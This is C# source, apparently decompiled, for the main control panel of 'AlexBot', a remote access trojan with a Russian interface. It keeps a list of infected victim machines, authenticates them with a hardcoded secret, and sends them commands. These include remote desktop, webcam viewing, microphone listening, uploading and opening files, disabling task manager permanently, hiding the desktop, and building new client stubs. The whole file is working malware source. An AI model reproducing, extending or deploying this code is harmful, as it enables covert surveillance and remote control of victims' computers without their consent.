using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace AlexBot
{
	public class Main : Form
	{
		public ToolSocket TSocket;

		public static string SecretCode = "290Sko2-0SL";

		public static string NewConnect = "newconnection";

		public int Fport = 0;

		public new int Select;

		public List<Socket> ListUsersConnections = new List<Socket>();

		public Socket Selected;

		public bool tc = true;

		public Thread[] threads = new Thread[3];

		private IContainer components = null;

		private PictureBox pictureBox1;

		private ListView listView1;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader2;

		private ColumnHeader Pros;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem toolStripMenuItem_0;

		private ToolStripMenuItem toolStripMenuItem_1;

		private ToolStripMenuItem toolStripMenuItem_2;

		private ToolStripMenuItem toolStripMenuItem_3;

		private ToolStripMenuItem toolStripMenuItem_4;

		private OpenFileDialog openFileDialog1;

		private ToolStripMenuItem toolStripMenuItem_5;

		private ColumnHeader columnHeader5;

		private ToolStripMenuItem toolStripMenuItem_6;

		private ToolStripSeparator toolStripSeparator1;

		private ToolStripMenuItem toolStripMenuItem1;

		private ToolStripMenuItem toolStripMenuItem_7;

		private ToolStripMenuItem toolStripMenuItem_8;

		private ToolStripMenuItem toolStripMenuItem_9;

		private ToolStripMenuItem toolStripMenuItem_10;

		private ToolStripMenuItem toolStripMenuItem_11;

		private ToolStripMenuItem toolStripMenuItem_12;

		private ToolStripMenuItem toolStripMenuItem_13;

		private ToolStripMenuItem toolStripMenuItem_14;

		private ToolStripMenuItem toolStripMenuItem_15;

		private ToolStripMenuItem toolStripMenuItem_16;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripSeparator toolStripSeparator3;

		private ToolStripSeparator toolStripSeparator2;

		private ToolStripMenuItem toolStripMenuItem3;

		private PictureBox pictureBox2;

		private ColumnHeader columnHeader6;

		private ToolStripSeparator toolStripSeparator4;

		private ToolStripMenuItem toolStripMenuItem_17;

		private ToolTip toolTip1;

		public ListView ListItems => listView1;

		internal Main()
		{
			InitializeComponent();
		}

		private void MainShown(object sender, EventArgs e)
		{
			OpenPortDialog openPortDialog = new OpenPortDialog();
			openPortDialog.ShowDialog();
			Text = "AlexBot / Порт: " + openPortDialog.FuturePort + " / Пользователи: " + ListUsersConnections.Count;
			Fport = openPortDialog.FuturePort;
			TSocket = new ToolSocket(ToolSocket.GetLocalIPAddress(), openPortDialog.FuturePort, this);
			threads[0] = new Thread(ShowInThread);
			threads[0].IsBackground = true;
			threads[0].Start();
			threads[1] = new Thread(CheckedOnline);
			threads[1].IsBackground = true;
			threads[1].Start();
			threads[2] = new Thread(UpdateTitle);
			threads[2].IsBackground = true;
			threads[2].Start();
			pictureBox2.BackColor = Color.Transparent;
		}

		private void UpdateTitle()
		{
			while (tc)
			{
				Thread.Sleep(2000);
				Action action = delegate
				{
					Text = "AlexBot / Порт: " + Fport + " / Пользователи: " + ListUsersConnections.Count;
				};
				if (base.InvokeRequired)
				{
					Invoke(action);
				}
				else
				{
					action();
				}
			}
		}

		public void SetTraffic(int read, int write)
		{
			Invoke((Action)delegate
			{
			});
		}

		public void sendCommand(Socket s, string command, params string[] parameters)
		{
			TSocket.Write(SecretCode + "|" + command + "|" + string.Join("|", parameters), s);
		}

		private void CheckedOnline()
		{
			while (tc)
			{
				Thread.Sleep(2000);
				int count = 0;
				try
				{
					Socket[] array = ListUsersConnections.ToArray();
					foreach (Socket s in array)
					{
						if (!ToolSocket.SocketConnected(s))
						{
							ListUsersConnections.RemoveAt(count);
							Action action = delegate
							{
								listView1.Items.RemoveAt(count);
							};
							if (base.InvokeRequired)
							{
								Invoke(action);
							}
							else
							{
								action();
							}
						}
						count = checked(count + 1);
					}
				}
				catch (Exception)
				{
				}
			}
		}

		public void addNewUser(ListView list, string ip, string[] items)
		{
			Action action = delegate
			{
				list.Items.Add(ip).SubItems.AddRange(items);
			};
			if (base.InvokeRequired)
			{
				Invoke(action);
			}
			else
			{
				action();
			}
		}

		private void ShowInThread()
		{
			ToolSocket tSocket = TSocket;
			tSocket.AutoStart();
			Socket socket;
			while ((socket = tSocket.Accept()) != null && tc)
			{
				string text = tSocket.Read(1024, socket);
				string[] array = text.Split('|');
				IPAddress address = ((IPEndPoint)socket.RemoteEndPoint).Address;
				if (array.Length > 0 && array[0] == SecretCode && array[1] == NewConnect)
				{
					if (!ListUsersConnections.Contains(socket))
					{
						ListUsersConnections.Add(socket);
						addNewUser(listView1, address.ToString(), new string[6]
						{
							array[2],
							array[3],
							array[4],
							array[5],
							array[6],
							"0 KB / 0 KB "
						});
					}
				}
				else
				{
					socket.Disconnect(reuseSocket: false);
				}
			}
		}

		private void ListView1SelectedIndexChanged(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count > 0)
			{
				int index = listView1.SelectedItems[0].Index;
				Selected = ListUsersConnections[index];
				Select = index;
			}
		}

		private void toolStripMenuItem_0_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				MessageDialog messageDialog = new MessageDialog();
				messageDialog.selected = Selected;
				messageDialog.tsock = TSocket;
				messageDialog.ShowDialog();
			}
		}

		private void toolStripMenuItem_13_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				TSocket.sendCommand(Selected, "taskmng", "false");
			}
		}

		private void toolStripMenuItem_3_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				ProccessList proccessList = new ProccessList();
				proccessList.selected = Selected;
				proccessList.tsock = TSocket;
				proccessList.proccessname = Path.GetFileNameWithoutExtension(listView1.SelectedItems[0].SubItems[4].Text);
				proccessList.ShowDialog();
			}
		}

		private void toolStripMenuItem_2_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				RemoteDesktop remoteDesktop = new RemoteDesktop();
				remoteDesktop.tsock = TSocket;
				remoteDesktop.selected = Selected;
				remoteDesktop.ShowDialog();
				remoteDesktop.Dispose();
				remoteDesktop.Close();
			}
		}

		private void toolStripMenuItem_4_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				openFileDialog1.ShowDialog();
				if (File.Exists(openFileDialog1.FileName))
				{
					byte[] array = File.ReadAllBytes(openFileDialog1.FileName);
					string fileName = Path.GetFileName(openFileDialog1.FileName);
					sendCommand(Selected, "uploadFile", fileName, Convert.ToString(array.Length));
					int bytes = Selected.Send(array);
					TSocket.UpdateTraffic(Selected, bytes, "write");
				}
			}
		}

		private void toolStripMenuItem_5_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				DialogResult dialogResult = MessageBox.Show("Вы уверены что хотите удалить пользователя с базы?", "Информация", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (dialogResult == DialogResult.Yes)
				{
					TSocket.sendCommand(Selected, "terminate", "1");
				}
			}
		}

		private void MainFormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				Process process = new Process();
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.Arguments = "/C taskkill /f /im " + Path.GetFileName(Application.ExecutablePath);
				process.Start();
			}
			catch (Exception)
			{
			}
		}

		private void toolStripMenuItem_6_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				FullInfo fullInfo = new FullInfo();
				fullInfo.tsock = TSocket;
				fullInfo.sock = Selected;
				fullInfo.ip = listView1.SelectedItems[0].Text;
				fullInfo.ShowDialog();
			}
		}

		private void method_0(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				MessageView messageView = new MessageView();
				messageView.sock = Selected;
				messageView.tsock = TSocket;
				messageView.ShowDialog();
			}
		}

		private void toolStripMenuItem_15_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				TSocket.sendCommand(Selected, "opendisk", "1");
			}
		}

		private void toolStripMenuItem_16_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				TSocket.sendCommand(Selected, "closedisk", "1");
			}
		}

		private void toolStripMenuItem_12_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				TSocket.sendCommand(Selected, "taskmng", "true");
			}
		}

		private void toolStripMenuItem_9_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				TSocket.sendCommand(Selected, "link.open", "explorer");
			}
		}

		private void toolStripMenuItem_10_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				TSocket.sendCommand(Selected, "proccess.kill", "explorer.exe");
			}
		}

		private void ToolStripMenuItem2Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				WebCamViewer webCamViewer = new WebCamViewer();
				webCamViewer.sock = Selected;
				webCamViewer.tsock = TSocket;
				webCamViewer.ShowDialog();
			}
		}

		private void toolStripMenuItem_14_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				Speaker speaker = new Speaker();
				speaker.sock = Selected;
				speaker.tsock = TSocket;
				speaker.ShowDialog();
			}
		}

		private void ToolStripMenuItem3Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				VoiceManager voiceManager = new VoiceManager();
				voiceManager.sock = Selected;
				voiceManager.tsock = TSocket;
				voiceManager.ShowDialog();
			}
		}

		private void PictureBox2Click(object sender, EventArgs e)
		{
			BuildStub buildStub = new BuildStub();
			buildStub.ShowDialog();
		}

		private void toolStripMenuItem_1_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				OpenLink openLink = new OpenLink();
				openLink.sock = Selected;
				openLink.tsock = TSocket;
				openLink.ShowDialog();
			}
		}

		private void toolStripMenuItem_17_Click(object sender, EventArgs e)
		{
			if (Selected != null && ToolSocket.SocketConnected(Selected))
			{
				listView1.Items[Select].SubItems[6].Text = "0 KB / 0 KB";
			}
		}

		private void PictureBox3Click(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(AlexBot.Main));
			pictureBox1 = new System.Windows.Forms.PictureBox();
			listView1 = new System.Windows.Forms.ListView();
			columnHeader1 = new System.Windows.Forms.ColumnHeader();
			columnHeader2 = new System.Windows.Forms.ColumnHeader();
			Pros = new System.Windows.Forms.ColumnHeader();
			columnHeader3 = new System.Windows.Forms.ColumnHeader();
			columnHeader4 = new System.Windows.Forms.ColumnHeader();
			columnHeader5 = new System.Windows.Forms.ColumnHeader();
			columnHeader6 = new System.Windows.Forms.ColumnHeader();
			contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(components);
			toolStripMenuItem_6 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_7 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_15 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_16 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_8 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_9 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_10 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_11 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_12 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_13 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_14 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
			toolStripMenuItem_17 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
			toolStripMenuItem_0 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_1 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_4 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
			toolStripMenuItem_2 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem_3 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
			toolStripMenuItem_5 = new System.Windows.Forms.ToolStripMenuItem();
			openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
			pictureBox2 = new System.Windows.Forms.PictureBox();
			toolTip1 = new System.Windows.Forms.ToolTip(components);
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			contextMenuStrip1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox2).BeginInit();
			SuspendLayout();
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(0, 0);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(788, 483);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
			pictureBox1.TabIndex = 0;
			pictureBox1.TabStop = false;
			listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[7]
			{
				columnHeader1,
				columnHeader2,
				Pros,
				columnHeader3,
				columnHeader4,
				columnHeader5,
				columnHeader6
			});
			listView1.ContextMenuStrip = contextMenuStrip1;
			listView1.Font = new System.Drawing.Font("Segoe UI Light", 9.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
			listView1.FullRowSelect = true;
			listView1.GridLines = true;
			listView1.Location = new System.Drawing.Point(12, 111);
			listView1.Name = "listView1";
			listView1.Size = new System.Drawing.Size(763, 344);
			listView1.TabIndex = 1;
			listView1.UseCompatibleStateImageBehavior = false;
			listView1.View = System.Windows.Forms.View.Details;
			listView1.SelectedIndexChanged += new System.EventHandler(ListView1SelectedIndexChanged);
			columnHeader1.Text = "IP Адрес";
			columnHeader1.Width = 120;
			columnHeader2.Text = "Имя компьютера";
			columnHeader2.Width = 120;
			Pros.Text = "Версия Windows";
			Pros.Width = 110;
			columnHeader3.Text = "Дата установки";
			columnHeader3.Width = 120;
			columnHeader4.Text = "Имя файла";
			columnHeader4.Width = 90;
			columnHeader5.Text = "Антивирус";
			columnHeader5.Width = 90;
			columnHeader6.Text = "Трафик";
			columnHeader6.Width = 100;
			contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[13]
			{
				toolStripMenuItem_6,
				toolStripMenuItem1,
				toolStripSeparator3,
				toolStripMenuItem_0,
				toolStripMenuItem_1,
				toolStripMenuItem_4,
				toolStripSeparator2,
				toolStripMenuItem_2,
				toolStripMenuItem2,
				toolStripMenuItem_3,
				toolStripMenuItem3,
				toolStripSeparator1,
				toolStripMenuItem_5
			});
			contextMenuStrip1.Name = "contextMenuStrip1";
			contextMenuStrip1.Size = new System.Drawing.Size(235, 242);
			toolStripMenuItem_6.Name = "полнаяИнформацияОПКToolStripMenuItem";
			toolStripMenuItem_6.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_6.Text = "Полная информация о ПК";
			toolStripMenuItem_6.Click += new System.EventHandler(toolStripMenuItem_6_Click);
			toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6]
			{
				toolStripMenuItem_7,
				toolStripMenuItem_8,
				toolStripMenuItem_11,
				toolStripMenuItem_14,
				toolStripSeparator4,
				toolStripMenuItem_17
			});
			toolStripMenuItem1.Name = "toolStripMenuItem1";
			toolStripMenuItem1.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem1.Text = "Дополнительные функции";
			toolStripMenuItem_7.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2]
			{
				toolStripMenuItem_15,
				toolStripMenuItem_16
			});
			toolStripMenuItem_7.Name = "открытьДисководToolStripMenuItem";
			toolStripMenuItem_7.Size = new System.Drawing.Size(171, 22);
			toolStripMenuItem_7.Text = "CD ROM";
			toolStripMenuItem_15.Name = "открытьToolStripMenuItem";
			toolStripMenuItem_15.Size = new System.Drawing.Size(121, 22);
			toolStripMenuItem_15.Text = "Открыть";
			toolStripMenuItem_15.Click += new System.EventHandler(toolStripMenuItem_15_Click);
			toolStripMenuItem_16.Name = "закрытьToolStripMenuItem";
			toolStripMenuItem_16.Size = new System.Drawing.Size(121, 22);
			toolStripMenuItem_16.Text = "Закрыть";
			toolStripMenuItem_16.Click += new System.EventHandler(toolStripMenuItem_16_Click);
			toolStripMenuItem_8.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2]
			{
				toolStripMenuItem_9,
				toolStripMenuItem_10
			});
			toolStripMenuItem_8.Name = "рабочийСтолToolStripMenuItem";
			toolStripMenuItem_8.Size = new System.Drawing.Size(171, 22);
			toolStripMenuItem_8.Text = "Рабочий стол";
			toolStripMenuItem_9.Name = "показатьToolStripMenuItem";
			toolStripMenuItem_9.Size = new System.Drawing.Size(124, 22);
			toolStripMenuItem_9.Text = "Показать";
			toolStripMenuItem_9.Click += new System.EventHandler(toolStripMenuItem_9_Click);
			toolStripMenuItem_10.Name = "скрытьToolStripMenuItem";
			toolStripMenuItem_10.Size = new System.Drawing.Size(124, 22);
			toolStripMenuItem_10.Text = "Скрыть";
			toolStripMenuItem_10.Click += new System.EventHandler(toolStripMenuItem_10_Click);
			toolStripMenuItem_11.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2]
			{
				toolStripMenuItem_12,
				toolStripMenuItem_13
			});
			toolStripMenuItem_11.Name = "диспетчерЗадачToolStripMenuItem";
			toolStripMenuItem_11.Size = new System.Drawing.Size(171, 22);
			toolStripMenuItem_11.Text = "Диспетчер задач";
			toolStripMenuItem_12.Name = "включитьToolStripMenuItem";
			toolStripMenuItem_12.Size = new System.Drawing.Size(187, 22);
			toolStripMenuItem_12.Text = "Включить";
			toolStripMenuItem_12.Click += new System.EventHandler(toolStripMenuItem_12_Click);
			toolStripMenuItem_13.Name = "отключитьToolStripMenuItem";
			toolStripMenuItem_13.Size = new System.Drawing.Size(187, 22);
			toolStripMenuItem_13.Text = "Oтключить навсегда";
			toolStripMenuItem_13.Click += new System.EventHandler(toolStripMenuItem_13_Click);
			toolStripMenuItem_14.Name = "синтезаторРечиToolStripMenuItem";
			toolStripMenuItem_14.Size = new System.Drawing.Size(171, 22);
			toolStripMenuItem_14.Text = "Синтезатор речи";
			toolStripMenuItem_14.Click += new System.EventHandler(toolStripMenuItem_14_Click);
			toolStripSeparator4.Name = "toolStripSeparator4";
			toolStripSeparator4.Size = new System.Drawing.Size(168, 6);
			toolStripMenuItem_17.Name = "обновитьТрафикToolStripMenuItem";
			toolStripMenuItem_17.Size = new System.Drawing.Size(171, 22);
			toolStripMenuItem_17.Text = "Обновить трафик";
			toolStripMenuItem_17.Click += new System.EventHandler(toolStripMenuItem_17_Click);
			toolStripSeparator3.Name = "toolStripSeparator3";
			toolStripSeparator3.Size = new System.Drawing.Size(231, 6);
			toolStripMenuItem_0.Name = "отправитьСообщениеToolStripMenuItem";
			toolStripMenuItem_0.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_0.Text = "Отправить сообщение";
			toolStripMenuItem_0.Click += new System.EventHandler(toolStripMenuItem_0_Click);
			toolStripMenuItem_1.Name = "открытьСсылкуToolStripMenuItem";
			toolStripMenuItem_1.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_1.Text = "Открыть ссылку";
			toolStripMenuItem_1.Click += new System.EventHandler(toolStripMenuItem_1_Click);
			toolStripMenuItem_4.Name = "загрузитьФайлИОткрытьToolStripMenuItem";
			toolStripMenuItem_4.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_4.Text = "Загрузить файл и открыть";
			toolStripMenuItem_4.Click += new System.EventHandler(toolStripMenuItem_4_Click);
			toolStripSeparator2.Name = "toolStripSeparator2";
			toolStripSeparator2.Size = new System.Drawing.Size(231, 6);
			toolStripMenuItem_2.Name = "просмотрЭкранаToolStripMenuItem";
			toolStripMenuItem_2.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_2.Text = "Удалённый рабочий стол";
			toolStripMenuItem_2.Click += new System.EventHandler(toolStripMenuItem_2_Click);
			toolStripMenuItem2.Name = "toolStripMenuItem2";
			toolStripMenuItem2.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem2.Text = "Удалённая Веб-Камера";
			toolStripMenuItem2.Click += new System.EventHandler(ToolStripMenuItem2Click);
			toolStripMenuItem_3.Name = "текущиеПроцессыToolStripMenuItem";
			toolStripMenuItem_3.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_3.Text = "Удалённый диспетчер задач";
			toolStripMenuItem_3.Click += new System.EventHandler(toolStripMenuItem_3_Click);
			toolStripMenuItem3.Name = "toolStripMenuItem3";
			toolStripMenuItem3.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem3.Text = "Прослушивание микрофона";
			toolStripMenuItem3.Click += new System.EventHandler(ToolStripMenuItem3Click);
			toolStripSeparator1.Name = "toolStripSeparator1";
			toolStripSeparator1.Size = new System.Drawing.Size(231, 6);
			toolStripMenuItem_5.Name = "завершитьРаботуПроцессаToolStripMenuItem";
			toolStripMenuItem_5.Size = new System.Drawing.Size(234, 22);
			toolStripMenuItem_5.Text = "Удалить ПК с базы";
			toolStripMenuItem_5.Click += new System.EventHandler(toolStripMenuItem_5_Click);
			openFileDialog1.Title = "Выберите файл для загрузки";
			pictureBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("pictureBox2.BackgroundImage");
			pictureBox2.Cursor = System.Windows.Forms.Cursors.Hand;
			pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
			pictureBox2.Location = new System.Drawing.Point(586, 28);
			pictureBox2.Name = "pictureBox2";
			pictureBox2.Size = new System.Drawing.Size(194, 48);
			pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
			pictureBox2.TabIndex = 2;
			pictureBox2.TabStop = false;
			pictureBox2.Click += new System.EventHandler(PictureBox2Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(787, 482);
			base.Controls.Add(pictureBox2);
			base.Controls.Add(listView1);
			base.Controls.Add(pictureBox1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Main";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "AlexBot";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(MainFormClosed);
			base.Shown += new System.EventHandler(MainShown);
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			contextMenuStrip1.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)pictureBox2).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
